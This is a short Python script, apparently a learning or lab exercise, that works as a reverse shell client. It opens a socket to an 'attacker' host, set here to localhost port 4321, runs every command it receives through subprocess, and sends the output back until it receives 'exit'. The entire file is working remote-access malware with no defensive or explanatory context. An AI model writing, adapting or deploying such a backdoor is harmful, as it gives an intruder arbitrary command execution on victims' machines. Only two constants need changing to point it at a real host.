import socket
import subprocess
import os

SERVER_IP = '127.0.0.1'
SERVER_PORT = 4321

def connect_to_attacker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((SERVER_IP, SERVER_PORT))
    except Exception as e:
        print(f"Erreur de connexion: {e}")
        return

    while True:
        try:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                s.close()
                break

            if command[:2] == 'cd':
                try:
                    os.chdir(command[3:])
                    result = f"Changed directory to {os.getcwd()}\n"
                except FileNotFoundError as e:
                    result = str(e) + "\n"
            else:
                result = subprocess.getoutput(command) + "\n"

            s.send(result.encode('utf-8'))

        except Exception as e:
            s.close()
            break

if __name__ == "__main__":
    connect_to_attacker()
